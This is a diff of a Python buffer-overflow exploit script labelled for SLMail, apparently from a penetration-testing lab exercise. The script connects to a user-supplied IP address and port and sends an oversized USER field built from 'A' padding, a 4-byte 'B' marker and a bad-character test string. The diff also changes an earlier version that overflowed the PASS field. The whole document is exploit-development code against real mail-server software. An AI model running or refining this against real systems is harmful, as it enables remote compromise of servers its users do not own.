@@ -1,25 +1,28 @@
 #!/usr/bin/python3
+# /x00, /x0a, /x0d
 import sys,socket
 
+print("*******Slmail buffer overflow********")
 ip_address=input("Enter the IP address\n")
-port_number=input("Enter the port number\n")
+port=input("Enter the port numeber\n")
 
 
-if (len(ip_address)<=0) or (len(port_number)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0):
-        print("*" * 30)
+if (len(ip_address)==0) or (len(port)==0):
+    if (len(ip_address)>0) and (len(port)==0):
+        print("*"*30)
         print("Port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0):
-        print("*" * 30)
+    elif (len(ip_address)==0) and (len(port)>0):
+        print("*"*30)
         print("IP address field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0):
-        print("*" * 30)
+    elif (len(ip_address)==0) and (len(port)==0):
+        print("*"*30)
         print("IP address field is empty")
         print("Port number field is empty")
     else:
-        print("*" * 30)
+        print("*"*30)
         print("Issues with the user input")
-elif (len(ip_address)>0) and (len(port_number)>0):
+
+elif (len(ip_address)>0) and (len(port)>0):
     badchars = (
   b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
   b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -40,9 +43,9 @@ elif (len(ip_address)>0) and (len(port_number)>0):
 )
 
 
-    size=b"A" * 2606 + b"B" * 4 + badchars
+    buffer=b"A" * 558 + b"B" * 4 +badchars 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip_address, int(port_number)))
-    s.send(b"USER hrishi" + b"\r\n") 
-    s.send(b"PASS " + size + b"\r\n") 
+    s.connect((ip_address,int(port)))
+    s.send(b"USER HRISHI" + b"\r\n")
+    s.send(b"USER " + buffer + b"\r\n")
     s.close()
